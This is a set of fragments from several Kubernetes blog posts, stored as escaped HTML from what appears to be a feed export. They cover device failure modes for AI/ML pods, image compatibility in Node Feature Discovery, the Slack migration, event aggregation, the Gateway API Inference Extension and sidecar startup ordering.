too long.</li>\n</ul>\n<p>Another class of Kubernetes infra-related issues is driver-related. With\ntraditional resources like CPU and memory, no compatibility checks between the\napplication and hardware were needed. With special devices like hardware\naccelerators, there are new failure modes. Device drivers installed on the node:</p>\n<ul>\n<li>Must match the hardware</li>\n<li>Be compatible with an app</li>\n<li>Must work with other drivers (like <a href=\"https://developer.nvidia.com/nccl\">nccl</a>,\netc.)</li>\n</ul>\n<p>Best practices for handling driver versions:</p>\n<ul>\n<li>Monitor driver installer health</li>\n<li>Plan upgrades of infrastructure and Pods to match the version</li>\n<li>Have canary deployments whenever possible</li>\n</ul>\n<p>Following the best practices in this section and using device plugins and device\ndriver installers from trusted and reliable sources generally eliminate this\nclass of failures. Kubernetes is tracking work to make this space even better.</p>\n<h3 id=\"failure-modes-device-failed\">Failure modes: device failed</h3>\n<p>There is very little handling of device failure in Kubernetes today. Device\nplugins report the device failure only by changing the count of allocatable\ndevices. And Kubernetes relies on standard mechanisms like liveness probes or\ncontainer failures to allow Pods to communicate the failure condition to the\nkubelet. However, Kubernetes does not correlate device failures with container\ncrashes and does not offer any mitigation beyond restarting the container while\nbeing attached to the same device.</p>\n<p>This is why many plugins and DIY solutions exist to handle device failures based\non various signals.</p>\n<h4 id=\"health-controller\">Health controller</h4>\n<p>In many cases a failed device will result in unrecoverable and very expensive\nnodes doing nothing. A simple DIY solution is a <em>node health controller</em>. The\ncontroller could compare the device allocatable count with the capacity and if\nthe capacity is greater, it starts a timer. Once the timer reaches a threshold,\nthe health controller kills and recreates a node.</p>\n<p>There are problems with the <em>health controller</em> approach:</p>\n<ul>\n<li>Root cause of the device failure is typically not known</li>\n<li>The controller is not workload aware</li>\n<li>Failed device might not be in use and you want to keep other devices running</li>\n<li>The detection may be too slow as it is very generic</li>\n<li>The node may be part of a bigger set of nodes and simply cannot be deleted in\nisolation without other nodes</li>\n</ul>\n<p>There are variations of the health controller solving some of the problems\nabove. The overall theme here though is that to best handle failed devices, you\nneed customized handling for the specific workload. Kubernetes doesn’t yet offer\nenough abstraction to express how critical the device is for a node, for the\ncluster, and for the Pod it is assigned to.</p>\n<h4 id=\"pod-failure-policy\">Pod failure policy</h4>\n<p>Another DIY approach for device failure handling is a per-pod reaction on a\nfailed device. This approach is applicable for <em>training</em> workloads that are\nimplemented as Jobs.</p>\n<p>Pod can define special error codes for device failures. For example, whenever\nunexpected device behavior is encountered, Pod exits with a special exit code.\nThen the Pod failure policy can handle the device failure in a special way. Read\nmore on <a href=\"https://kubernetes.io/docs/concepts/workloads/controllers/job/#pod-failure-policy\">Handling retriable and non-retriable pod failures with Pod failure\npolicy</a></p>\n<p>There are some problems with the <em>Pod failure policy</em> approach for Jobs:</p>\n<ul>\n<li>There is no well-known <em>device failed</em> condition, so this approach does not work for the\ngeneric Pod case</li>\n<li>Error codes must be coded carefully and in some cases are hard to guarantee.</li>\n<li>Only works with Jobs with <code>restartPolicy: Never</code>, due to the limitation of a pod\nfailure policy feature.</li>\n</ul>\n<p>So, this solution has limited applicability.</p>\n<h4 id=\"custom-pod-watcher\">Custom pod watcher</h4>\n<p>A little more generic approach is to implement the Pod watcher as a DIY solution\nor use some third party tools offering this functionality. The pod watcher is\nmost often used to handle device failures for inference workloads.</p>\n<p>Since Kubernetes just keeps a pod assigned to a device, even if the device is\nreportedly unhealthy, the idea is to detect this situation with the pod watcher\nand apply some remediation. It often involves obtaining device health status and\nits mapping to the Pod using Pod Resources API on the node. If a device fails,\nit can then delete the attached Pod as a remediation. The replica set will\nhandle the Pod recreation on a healthy device.</p>\n<p>The other reasons to implement this watcher:</p>\n<ul>\n<li>Without it, the Pod will keep being assigned to the failed device forever.</li>\n<li>There is no <em>descheduling</em> for a pod with <code>restartPolicy=Always</code>.</li>\n<li>There are no built-in controllers that delete Pods in CrashLoopBackoff.</li>\n</ul>\n<p>Problems with the <em>custom pod watcher</em>:</p>\n<ul>\n<li>The signal for the pod watcher is expensive to get, and involves some\nprivileged actions.</li>\n<li>It is a custom solution and it assumes the importance of a device for a Pod.</li>\n<li>The pod watcher relies on external controllers to reschedule a Pod.</li>\n</ul>\n<p>There are more variations of DIY solutions for handling device failures or\nupcoming maintenance. Overall, Kubernetes has enough extension points to\nimplement these solutions. However, some extension points require higher\nprivilege than users may be comfortable with or are too disruptive. The roadmap\nsection goes into more details on specific improvements in handling the device\nfailures.</p>\n<h3 id=\"failure-modes-container-code-failed\">Failure modes: container code failed</h3>\n<p>When the container code fails or something bad happens with it, like out of\nmemory conditions, Kubernetes knows how to handle those cases. There is either\nthe restart of a container, or a crash of a Pod if it has <code>restartPolicy: Never</code>\nand scheduling it on another node. Kubernetes has limited expressiveness on what\nis a failure (for example, non-zero exit code or liveness probe failure) and how\nto react on such a failure (mostly either Always restart or immediately fail the\nPod).</p>\n<p>This level of expressiveness is often not enough for the complicated AI/ML\nworkloads. AI/ML pods are better rescheduled locally or even in-place as that\nwould save on image pulling time and device allocation. AI/ML pods are often\ninterconnected and need to be restarted together. This adds another level of\ncomplexity and optimizing it often brings major savings in running AI/ML\nworkloads.</p>\n<p>There are various DIY solutions to handle Pod failures orchestration. The most\ntypical one is to wrap a main executable in a container by some orchestrator.\nAnd this orchestrator will be able to restart the main executable whenever the\njob needs to be restarted because some other pod has failed.</p>\n<p>Solutions like this are very fragile and elaborate. They are often worth the\nmoney saved comparing to a regular JobSet delete/recreate cycle when used in\nlarge training jobs. Making these solutions less fragile and more streamlined\nby developing new hooks and extension points in Kubernetes will make it\neasy to apply to smaller jobs, benefiting everybody.</p>\n<h3 id=\"failure-modes-device-degradation\">Failure modes: device degradation</h3>\n<p>Not all device failures are terminal for the overall workload or batch job.\nAs the hardware stack gets more and more\ncomplex, misconfiguration on one of the hardware stack layers, or driver\nfailures, may result in devices that are functional, but lagging on performance.\nOne device that is lagging behind can slow down the whole training job.</p>\n<p>We see reports of such cases more and more often. Kubernetes has no way to\nexpress this type of failures today and since it is the newest type of failure\nmode, there is not much of a best practice offered by hardware vendors for\ndetection and third party tooling for remediation of these situations.</p>\n<p>Typically, these failures are detected based on observed workload\ncharacteristics. For example, the expected speed of AI/ML training steps on\nparticular hardware. Remediation for those issues is highly depend on a workload needs.</p>\n<h2 id=\"roadmap\">Roadmap</h2>\n<p>As outlined in a section above, Kubernetes offers a lot of extension points\nwhich are used to implement various DIY solutions. The space of AI/ML is\ndeveloping very fast, with changing requirements and usage patterns. SIG Node is\ntaking a measured approach of enabling more extension points to implement the\nworkload-specific scenarios over introduction of new semantics to support\nspecific scenarios. This means prioritizing making information about failures\nreadily available over implementing automatic remediations for those failures\nthat might only be suitable for a subset of workloads.</p>\n<p>This approach ensures there are no drastic changes for workload handling which\nmay break existing, well-oiled DIY solutions or experiences with the existing\nmore traditional workloads.</p>\n<p>Many error handling techniques used today work for AI/ML, but are very\nexpensive. SIG Node will invest in extension points to make those cheaper, with\nthe understanding that the price cutting for AI/ML is critical.</p>\n<p>The following is the set of specific investments we envision for various failure\nmodes.</p>\n<h3 id=\"roadmap-for-failure-modes-k8s-infrastructure\">Roadmap for failure modes: K8s infrastructure</h3>\n<p>The area of Kubernetes infrastructure is the easiest to understand and very\nimportant to make right for the upcoming transition from Device Plugins to DRA.\nSIG Node is tracking many work items in this area, most notably the following:</p>\n<ul>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/127460\">integrate kubelet with the systemd watchdog · Issue\n#127460</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/128696\">DRA: detect stale DRA plugin sockets · Issue\n#128696</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/127803\">Support takeover for devicemanager/device-plugin · Issue\n#127803</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/127457\">Kubelet plugin registration reliability · Issue\n#127457</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/128167\">Recreate the Device Manager gRPC server if failed · Issue\n#128167</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/128043\">Retry pod admission on device plugin grpc failures · Issue\n#128043</a></li>\n</ul>\n<p>Basically, every interaction of Kubernetes components must be reliable via\neither the kubelet improvements or the best practices in plugins development\nand deployment.</p>\n<h3 id=\"roadmap-for-failure-modes-device-failed\">Roadmap for failure modes: device failed</h3>\n<p>For the device failures some patterns are already emerging in common scenarios\nthat Kubernetes can support. However, the very first step is to make information\nabout failed devices available easier. The very first step here is the work in\n<a href=\"https://kep.k8s.io/4680\">KEP 4680</a> (Add Resource Health Status to the Pod Status for\nDevice Plugin and DRA).</p>\n<p>Longer term ideas include to be tested:</p>\n<ul>\n<li>Integrate device failures into Pod Failure Policy.</li>\n<li>Node-local retry policies, enabling pod failure policies for Pods with\nrestartPolicy=OnFailure and possibly beyond that.</li>\n<li>Ability to <em>deschedule</em> pod, including with the <code>restartPolicy: Always</code>, so it can\nget a new device allocated.</li>\n<li>Add device health to the ResourceSlice used to represent devices in DRA,\nrather than simply withdrawing an unhealthy device from the ResourceSlice.</li>\n</ul>\n<h3 id=\"roadmap-for-failure-modes-container-code-failed\">Roadmap for failure modes: container code failed</h3>\n<p>The main improvements to handle container code failures for AI/ML workloads are\nall targeting cheaper error handling and recovery. The cheapness is mostly\ncoming from reuse of pre-allocated resources as much as possible. From reusing\nthe Pods by restarting containers in-place, to node local restart of containers\ninstead of rescheduling whenever possible, to snapshotting support, and\nre-scheduling prioritizing the same node to save on image pulls.</p>\n<p>Consider this scenario: A big training job needs 512 Pods to run. And one of the\npods failed. It means that all Pods need to be interrupted and synced up to\nrestart the failed step. The most efficient way to achieve this generally is to\nreuse as many Pods as possible by restarting them in-place, while replacing the\nfailed pod to clear up the error from it. Like demonstrated in this picture:</p>\n<figure>\n<img alt=\"The picture shows 512 pod, most ot them are green and have a recycle sign next to them indicating that they can be reused, and one Pod drawn in red, and a new green replacement Pod next to it indicating that it needs to be replaced.\" src=\"https://kubernetes.io/blog/2025/07/03/navigating-failures-in-pods-with-devices/inplace-pod-restarts.svg\" />\n</figure>\n<p>It is possible to implement this scenario, but all solutions implementing it are\nfragile due to lack of certain extension points in Kubernetes. Adding these\nextension points to implement this scenario is on the Kubernetes roadmap.</p>\n<h3 id=\"roadmap-for-failure-modes-device-degradation\">Roadmap for failure modes: device degradation</h3>\n<p>There is very little done in this area - there is no clear detection signal,\nvery limited troubleshooting tooling, and no built-in semantics to express the\n&quot;degraded&quot; device on Kubernetes. There has been discussion of adding data on\ndevice performance or degradation in the ResourceSlice used by DRA to represent\ndevices, but it is not yet clearly defined. There are also projects like\n<a href=\"https://github.com/medik8s/node-healthcheck-operator\">node-healthcheck-operator</a>\nthat can be used for some scenarios.</p>\n<p>We expect developments in this area from hardware vendors and cloud providers, and we expect to see mostly DIY\nsolutions in the near future. As more users get exposed to AI/ML workloads, this\nis a space needing feedback on patterns used here.</p>\n<h2 id=\"join-the-conversation\">Join the conversation</h2>\n<p>The Kubernetes community encourages feedback and participation in shaping the\nfuture of device failure handling.

      "summary": "<p>In industries where systems must run very reliably and meet strict performance criteria such as telecommunication, high-performance or AI computing, containerized applications often need specific operating system configuration or hardware presence.\nIt is common practice to require the use of specific versions of the kernel, its configuration, device drivers, or system components.\nDespite the existence of the <a href=\"https://opencontainers.org/\">Open Container Initiative (OCI)</a>, a governing community to define standards and specifications for container images, there has been a gap in expression of such compatibility requirements.\nThe need to address this issue has led to different proposals and, ultimately, an implementation in Kubernetes' <a href=\"https://kubernetes-sigs.github.io/node-feature-discovery/stable/get-started/index.html\">Node Feature Discovery (NFD)</a>.</p>\n<p><a href=\"https://kubernetes-sigs.github.io/node-feature-discovery/stable/get-started/index.html\">NFD</a> is an open source Kubernetes project that automatically detects and reports <a href=\"https://kubernetes-sigs.github.io/node-feature-discovery/v0.17/usage/customization-guide.html#available-features\">hardware and system features</a> of cluster nodes. This information helps users to schedule workloads on nodes that meet specific system requirements, which is especially useful for applications with strict hardware or operating system dependencies.</p>\n<h2 id=\"the-need-for-image-compatibility-specification\">The need for image compatibility specification</h2>\n<h3 id=\"dependencies-between-containers-and-host-os\">Dependencies between containers and host OS</h3>\n<p>A container image is built on a base image, which provides a minimal runtime environment, often a stripped-down Linux userland, completely empty or distroless. When an application requires certain features from the host OS, compatibility issues arise. These dependencies can manifest in several ways:</p>\n<ul>\n<li><strong>Drivers</strong>:\nHost driver versions must match the supported range of a library version inside the container to avoid compatibility problems. Examples include GPUs and network drivers.</li>\n<li><strong>Libraries or Software</strong>:\nThe container must come with a specific version or range of versions for a library or software to run optimally in the environment. Examples from high performance computing are MPI, EFA, or Infiniband.</li>\n<li><strong>Kernel Modules or Features</strong>:\nSpecific kernel features or modules must be present. Examples include having support of write protected huge page faults, or the presence of VFIO</li>\n<li>And more…</li>\n</ul>\n<p>While containers in Kubernetes are the most likely unit of abstraction for these needs, the definition of compatibility can extend further to include other container technologies such as Singularity and other OCI artifacts such as binaries from a spack binary cache.</p>\n<h3 id=\"multi-cloud-and-hybrid-cloud-challenges\">Multi-cloud and hybrid cloud challenges</h3>\n<p>Containerized applications are deployed across various Kubernetes distributions and cloud providers, where different host operating systems introduce compatibility challenges.\nOften those have to be pre-configured before workload deployment or are immutable.\nFor instance, different cloud providers will include different operating systems like:</p>\n<ul>\n<li><strong>RHCOS/RHEL</strong></li>\n<li><strong>Photon OS</strong></li>\n<li><strong>Amazon Linux 2</strong></li>\n<li><strong>Container-Optimized OS</strong></li>\n<li><strong>Azure Linux OS</strong></li>\n<li>And more...</li>\n</ul>\n<p>Each OS comes with unique kernel versions, configurations, and drivers, making compatibility a non-trivial issue for applications requiring specific features.\nIt must be possible to quickly assess a container for its suitability to run on any specific environment.</p>\n<h3 id=\"image-compatibility-initiative\">Image compatibility initiative</h3>\n<p>An effort was made within the <a href=\"https://github.com/opencontainers/wg-image-compatibility\">Open Containers Initiative Image Compatibility</a> working group to introduce a standard for image compatibility metadata.\nA specification for compatibility would allow container authors to declare required host OS features, making compatibility requirements discoverable and programmable.\nThe specification implemented in Kubernetes Node Feature Discovery is one of the discussed proposals.\nIt aims to:</p>\n<ul>\n<li><strong>Define a structured way to express compatibility in OCI image manifests.</strong></li>\n<li><strong>Support a compatibility specification alongside container images in image registries.</strong></li>\n<li><strong>Allow automated validation of compatibility before scheduling containers.</strong></li>\n</ul>\n<p>The concept has since been implemented in the Kubernetes Node Feature Discovery project.</p>\n<h3 id=\"implementation-in-node-feature-discovery\">Implementation in Node Feature Discovery</h3>\n<p>The solution integrates compatibility metadata into Kubernetes via NFD features and the <a href=\"https://kubernetes-sigs.github.io/node-feature-discovery/v0.17/usage/custom-resources.html#nodefeaturegroup\">NodeFeatureGroup</a> API.\nThis interface enables the user to match containers to nodes based on exposing features of hardware and software, allowing for intelligent scheduling and workload optimization.</p>\n<h3 id=\"compatibility-specification\">Compatibility specification</h3>\n<p>The compatibility specification is a structured list of compatibility objects containing <em><a href=\"https://kubernetes-sigs.github.io/node-feature-discovery/v0.17/usage/custom-resources.html#nodefeaturegroup\">Node Feature Groups</a></em>.\nThese objects define image requirements and facilitate validation against host nodes.\nThe feature requirements are described by using <a href=\"https://kubernetes-sigs.github.io/node-feature-discovery/v0.17/usage/customization-guide.html#available-features\">the list of available features</a> from the NFD project.\nThe schema has the following structure:</p>\n<ul>\n<li><strong>version</strong> (string) - Specifies the API version.</li>\n<li><strong>compatibilities</strong> (array of objects) - List of compatibility sets.\n<ul>\n<li><strong>rules</strong> (object) - Specifies <a href=\"https://kubernetes-sigs.github.io/node-feature-discovery/v0.17/usage/custom-resources.html#nodefeaturegroup\">NodeFeatureGroup</a> to define image requirements.</li>\n<li><strong>weight</strong> (int, optional) - Node affinity weight.</li>\n<li><strong>tag</strong> (string, optional) - Categorization tag.</li>\n<li><strong>description</strong> (string, optional) - Short description.</li>\n</ul>\n</li>\n</ul>\n<p>An example might look like the following:</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-yaml\"><span style=\"display: flex;\"><span><span style=\"color: #008000;

font-weight: bold;\">\\\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #b62; font-weight: bold;\"></span>--artifact-type application/vnd.nfd.image-compatibility.v1alpha1 &lt;image-url&gt;

This validation can be done using the\n<a href=\"https://kubernetes-sigs.github.io/node-feature-discovery/v0.17/reference/node-feature-client-reference.html\">nfd client</a>:</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-bash\"><span style=\"display: flex;\"><span>nfd compat validate-node --image &lt;image-url&gt;\n</span></span></code></pre></div></li>\n<li>\n<p><strong>Read the output from the client</strong></p>\n<p>Finally you can read the report generated by the tool or use your own tools to act based on the generated JSON report.</p>\n<p><img alt=\"validate-node command output\" src=\"https://kubernetes.io/blog/2025/06/25/image-compatibility-in-cloud-native-environments/validate-node-output.png\" /></p>\n</li>\n</ol>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>The addition of image compatibility to Kubernetes through Node Feature Discovery underscores the growing importance of addressing compatibility in cloud native environments.\nIt is only a start, as further work is needed to integrate compatibility into scheduling of workloads within and outside of Kubernetes.\nHowever, by integrating this feature into Kubernetes, mission-critical workloads can now define and validate host OS requirements more efficiently.\nMoving forward, the adoption of compatibility metadata within Kubernetes ecosystems will significantly enhance the reliability and performance of specialized containerized applications, ensuring they meet the stringent requirements of industries like telecommunications, high-performance computing or any environment that requires special hardware or host OS configuration.</p>\n<h2 id=\"get-involved\">Get involved</h2>\n<p>Join the <a href=\"https://kubernetes-sigs.github.io/node-feature-discovery/v0.17/contributing/\">Kubernetes Node Feature Discovery</a> project if you're interested in getting involved with the design and development of Image Compatibility API and tools.\nWe always welcome new contributors.</p>",

Stand by for more details, but for now, there is no urgency to back up private channels or direct messages.</p>\n<p><del>Kubernetes Slack will lose its special status and will be changing into a standard free Slack on June 20, 2025</del>. Sometime later this year, our community may move to a new platform. If you are responsible for a channel or private channel, or a member of a User Group, you will need to take some actions as soon as you can.</p>\n<p>For the last decade, Slack has supported our project with a free customized enterprise account. They have let us know that they can no longer do so, particularly since our Slack is one of the largest and more active ones on the platform. As such, they will be downgrading it to a standard free Slack while we decide on, and implement, other options.</p>\n<p>On Friday, June 20, we will be subject to the <a href=\"https://slack.com/help/articles/27204752526611-Feature-limitations-on-the-free-version-of-Slack\">feature limitations of free Slack</a>. The primary ones which will affect us will be only retaining 90 days of history, and having to disable several apps and workflows which we are currently using. The Slack Admin team will do their best to manage these limitations.</p>\n<p>Responsible channel owners, members of private channels, and members of User Groups should <a href=\"https://github.com/kubernetes/community/blob/master/communication/slack-migration-faq.md#what-actions-do-channel-owners-and-user-group-members-need-to-take-soon\">take some actions</a> to prepare for the upgrade and preserve information as soon as possible.</p>\n<p>The CNCF Projects Staff have proposed that our community look at migrating to Discord. Because of existing issues where we have been pushing the limits of Slack, they have already explored what a Kubernetes Discord would look like. Discord would allow us to implement new tools and integrations which would help the community, such as GitHub group membership synchronization. The Steering Committee will discuss and decide on our future platform.</p>\n<p>Please see our <a href=\"https://github.com/kubernetes/community/blob/master/communication/slack-migration-faq.md\">FAQ</a>, and check the <a href=\"https://groups.google.com/a/kubernetes.io/g/dev/\">kubernetes-dev mailing list</a> and the <a href=\"https://kubernetes.slack.com/archives/C9T0QMNG4\">#announcements channel</a> for further news.

This blog post explores how to build custom event aggregation systems that help engineering teams better understand cluster behavior and troubleshoot issues more effectively.</p>\n<h2 id=\"the-challenge-with-kubernetes-events\">The challenge with Kubernetes events</h2>\n<p>In a Kubernetes cluster, events are generated for various operations - from pod scheduling and container starts to volume mounts and network configurations. While these events are invaluable for debugging and monitoring, several challenges emerge in production environments:</p>\n<ol>\n<li><strong>Volume</strong>: Large clusters can generate thousands of events per minute</li>\n<li><strong>Retention</strong>: Default event retention is limited to one hour</li>\n<li><strong>Correlation</strong>: Related events from different components are not automatically linked</li>\n<li><strong>Classification</strong>: Events lack standardized severity or category classifications</li>\n<li><strong>Aggregation</strong>: Similar events are not automatically grouped</li>\n</ol>\n<p>To learn more about Events in Kubernetes, read the <a href=\"https://kubernetes.io/docs/reference/kubernetes-api/cluster-resources/event-v1/\">Event</a> API reference.</p>\n<h2 id=\"real-world-value\">Real-World value</h2>\n<p>Consider a production environment with tens of microservices where the users report intermittent transaction failures:</p>\n<p><strong>Traditional event aggregation process:</strong> Engineers are wasting hours sifting through thousands of standalone events spread across namespaces. By the time they look into it, the older events have long since purged, and correlating pod restarts to node-level issues is practically impossible.</p>\n<p><strong>With its event aggregation in its custom events:</strong> The system groups events across resources, instantly surfacing correlation patterns such as volume mount timeouts before pod restarts. History indicates it occurred during past record traffic spikes, highlighting a storage scalability issue in minutes rather than hours.</p>\n<p>The beneﬁt of this approach is that organizations that implement it commonly cut down their troubleshooting time significantly along with increasing the reliability of systems by detecting patterns early.</p>\n<h2 id=\"building-an-event-aggregation-system\">Building an Event aggregation system</h2>\n<p>This post explores how to build a custom event aggregation system that addresses these challenges, aligned to Kubernetes best practices. I've picked the Go programming language for my example.</p>\n<h3 id=\"architecture-overview\">Architecture overview</h3>\n<p>This event aggregation system consists of three main components:</p>\n<ol>\n<li><strong>Event Watcher</strong>: Monitors the Kubernetes API for new events</li>\n<li><strong>Event Processor</strong>: Processes, categorizes, and correlates events</li>\n<li><strong>Storage Backend</strong>: Stores processed events for longer retention</li>\n</ol>\n<p>Here's a sketch for how to implement the event watcher:</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-go\"><span style=\"display: flex;\"><span><span style=\"color: #a2f;

      "summary": "<p>Modern generative AI and large language model (LLM) services create unique traffic-routing challenges\non Kubernetes. Unlike typical short-lived, stateless web requests, LLM inference sessions are often\nlong-running, resource-intensive, and partially stateful. For example, a single GPU-backed model server\nmay keep multiple inference sessions active and maintain in-memory token caches.</p>\n<p>Traditional load balancers focused on HTTP path or round-robin lack the specialized capabilities needed\nfor these workloads. They also don’t account for model identity or request criticality (e.g., interactive\nchat vs. batch jobs). Organizations often patch together ad-hoc solutions, but a standardized approach\nis missing.</p>\n<h2 id=\"gateway-api-inference-extension\">Gateway API Inference Extension</h2>\n<p><a href=\"https://gateway-api-inference-extension.sigs.k8s.io/\">Gateway API Inference Extension</a> was created to address\nthis gap by building on the existing <a href=\"https://gateway-api.sigs.k8s.io/\">Gateway API</a>, adding inference-specific\nrouting capabilities while retaining the familiar model of Gateways and HTTPRoutes. By adding an inference\nextension to your existing gateway, you effectively transform it into an <strong>Inference Gateway</strong>, enabling you to\nself-host GenAI/LLMs with a “model-as-a-service” mindset.</p>\n<p>The project’s goal is to improve and standardize routing to inference workloads across the ecosystem. Key\nobjectives include enabling model-aware routing, supporting per-request criticalities, facilitating safe model\nroll-outs, and optimizing load balancing based on real-time model metrics. By achieving these, the project aims\nto reduce latency and improve accelerator (GPU) utilization for AI workloads.</p>\n<h2 id=\"how-it-works\">How it works</h2>\n<p>The design introduces two new Custom Resources (CRDs) with distinct responsibilities, each aligning with a\nspecific user persona in the AI/ML serving workflow​:</p>\n<figure class=\"diagram-large clickable-zoom\">\n<img alt=\"Resource Model\" src=\"https://kubernetes.io/blog/2025/06/05/introducing-gateway-api-inference-extension/inference-extension-resource-model.png\" />\n</figure>\n<ol>\n<li>\n<p><a href=\"https://gateway-api-inference-extension.sigs.k8s.io/api-types/inferencepool/\">InferencePool</a>\nDefines a pool of pods (model servers) running on shared compute (e.g., GPU nodes). The platform admin can\nconfigure how these pods are deployed, scaled, and balanced. An InferencePool ensures consistent resource\nusage and enforces platform-wide policies. An InferencePool is similar to a Service but specialized for AI/ML\nserving needs and aware of the model-serving protocol.</p>\n</li>\n<li>\n<p><a href=\"https://gateway-api-inference-extension.sigs.k8s.io/api-types/inferencemodel/\">InferenceModel</a>\nA user-facing model endpoint managed by AI/ML owners. It maps a public name (e.g., &quot;gpt-4-chat&quot;) to the actual\nmodel within an InferencePool. This lets workload owners specify which models (and optional fine-tuning) they\nwant served, plus a traffic-splitting or prioritization policy.</p>\n</li>\n</ol>\n<p>In summary, the InferenceModel API lets AI/ML owners manage what is served, while the InferencePool lets platform\noperators manage where and how it’s served.</p>\n<h2 id=\"request-flow\">Request flow</h2>\n<p>The flow of a request builds on the Gateway API model (Gateways and HTTPRoutes) with one or more extra inference-aware\nsteps (extensions) in the middle. Here’s a high-level example of the request flow with the\n<a href=\"https://gateway-api-inference-extension.sigs.k8s.io/#endpoint-selection-extension\">Endpoint Selection Extension (ESE)</a>:</p>\n<figure class=\"diagram-large clickable-zoom\">\n<img alt=\"Request Flow\" src=\"https://kubernetes.io/blog/2025/06/05/introducing-gateway-api-inference-extension/inference-extension-request-flow.png\" />\n</figure>\n<ol>\n<li>\n<p><strong>Gateway Routing</strong><br />\nA client sends a request (e.g., an HTTP POST to /completions).

Additionally, the design is extensible—any Inference Gateway can be enhanced with additional inference-specific\nextensions to handle new routing strategies, advanced scheduling logic, or specialized hardware needs. As the project\ncontinues to grow, contributors are encouraged to develop new extensions that are fully compatible with the same underlying\nGateway API model, further expanding the possibilities for efficient and intelligent GenAI/LLM routing.</p>\n<h2 id=\"benchmarks\">Benchmarks</h2>\n<p>We evaluated ​this extension against a standard Kubernetes Service for a <a href=\"https://docs.vllm.ai/en/latest/\">vLLM</a>‐based model\nserving deployment. The test environment consisted of multiple H100 (80 GB) GPU pods running vLLM (<a href=\"https://blog.vllm.ai/2025/01/27/v1-alpha-release.html\">version 1</a>)\non a Kubernetes cluster, with 10 Llama2 model replicas. The <a href=\"https://github.com/AI-Hypercomputer/inference-benchmark\">Latency Profile Generator (LPG)</a>\ntool was used to generate traffic and measure throughput, latency, and other metrics. The\n<a href=\"https://huggingface.co/datasets/anon8231489123/ShareGPT_Vicuna_unfiltered/resolve/main/ShareGPT_V3_unfiltered_cleaned_split.json\">ShareGPT</a>\ndataset served as the workload, and traffic was ramped from 100 Queries per Second (QPS) up to 1000 QPS.</p>\n<h3 id=\"key-results\">Key results</h3>\n<figure class=\"diagram-large clickable-zoom\">\n<img alt=\"Endpoint Extension Scheduling\" src=\"https://kubernetes.io/blog/2025/06/05/introducing-gateway-api-inference-extension/inference-extension-benchmark.png\" />\n</figure>\n<ul>\n<li>\n<p><strong>Comparable Throughput</strong>: Throughout the tested QPS range, the ESE delivered throughput roughly on par with a standard\nKubernetes Service.</p>\n</li>\n<li>\n<p><strong>Lower Latency</strong>:</p>\n<ul>\n<li><strong>Per‐Output‐Token Latency</strong>: The ​ESE showed significantly lower p90 latency at higher QPS (500+), indicating that\nits model-aware routing decisions reduce queueing and resource contention as GPU memory approaches saturation.</li>\n<li><strong>Overall p90 Latency</strong>: Similar trends emerged, with the ​ESE reducing end‐to‐end tail latencies compared to the\nbaseline, particularly as traffic increased beyond 400–500 QPS.</li>\n</ul>\n</li>\n</ul>\n<p>These results suggest that this extension's model‐aware routing significantly reduced latency for GPU‐backed LLM\nworkloads. By dynamically selecting the least‐loaded or best‐performing model server, it avoids hotspots that can\nappear when using traditional load balancing methods for large, long‐running inference requests.</p>\n<h2 id=\"roadmap\">Roadmap</h2>\n<p>As the Gateway API Inference Extension heads toward GA, planned features include:</p>\n<ol>\n<li><strong>Prefix-cache aware load balancing</strong> for remote caches</li>\n<li><strong>LoRA adapter pipelines</strong> for automated rollout</li>\n<li><strong>Fairness and priority</strong> between workloads in the same criticality band</li>\n<li><strong>HPA support</strong> for scaling based on aggregate, per-model metrics</li>\n<li><strong>Support for large multi-modal inputs/outputs</strong></li>\n<li><strong>Additional model types</strong> (e.g., diffusion models)</li>\n<li><strong>Heterogeneous accelerators</strong> (serving on multiple accelerator types with latency- and cost-aware load balancing)</li>\n<li><strong>Disaggregated serving</strong> for independently scaling pools</li>\n</ol>\n<h2 id=\"summary\">Summary</h2>\n<p>By aligning model serving with Kubernetes-native tooling, Gateway API Inference Extension aims to simplify\nand standardize how AI/ML traffic is routed.

If you define Kubernetes-native sidecars, those are terminated <strong>after</strong> the main application. Furthermore, when used with <a href=\"https://kubernetes.io/docs/concepts/workloads/controllers/job/\">Jobs</a>, a sidecar container should still be alive and could potentially even restart after the owning Job is complete; Kubernetes-native sidecar containers do not block pod completion.</p>\n<p>To learn more, you can also read the official <a href=\"https://kubernetes.io/docs/tutorials/configuration/pod-sidecar-containers/\">Pod sidecar containers tutorial</a>.</p>\n<h2 id=\"the-problem\">The problem</h2>\n<p>Now you know that defining a sidecar with this native approach will always start it before the main application. From the <a href=\"https://github.com/kubernetes/kubernetes/blob/537a602195efdc04cdf2cb0368792afad082d9fd/pkg/kubelet/kuberuntime/kuberuntime_manager.go#L827-L830\">kubelet source code</a>, it's visible that this often means being started almost in parallel, and this is not always what an engineer wants to achieve. What I'm really interested in is whether I can delay the start of the main application until the sidecar is not just started, but fully running and ready to serve.\nIt might be a bit tricky because the problem with sidecars is there’s no obvious success signal, contrary to init containers - designed to run only for a specified period of time. With an init container, exit status 0 is unambiguously &quot;I succeeded&quot;. With a sidecar, there are lots of points at which you can say &quot;a thing is running&quot;.\nStarting one container only after the previous one is ready is part of a graceful deployment strategy, ensuring proper sequencing and stability during startup. It’s also actually how I’d expect sidecar containers to work as well, to cover the scenario where the main application is dependent on the sidecar. For example, it may happen that an app errors out if the sidecar isn’t available to serve requests (e.g., logging with DataDog). Sure, one could change the application code (and it would actually be the “best practice” solution), but sometimes they can’t - and this post focuses on this use case.</p>\n<p>I'll explain some ways that you might try, and show you what approaches will really work.</p>\n<h2 id=\"readiness-probe\">Readiness probe</h2>\n<p>To check whether Kubernetes native sidecar delays the start of the main application until the sidecar is ready, let’s simulate a short investigation. Firstly, I’ll simulate a sidecar container which will never be ready by implementing a readiness probe which will never succeed. As a reminder, a <a href=\"https://kubernetes.io/docs/concepts/configuration/liveness-readiness-startup-probes/\">readiness probe</a> checks if the container is ready to start accepting traffic and therefore, if the pod can be used as a 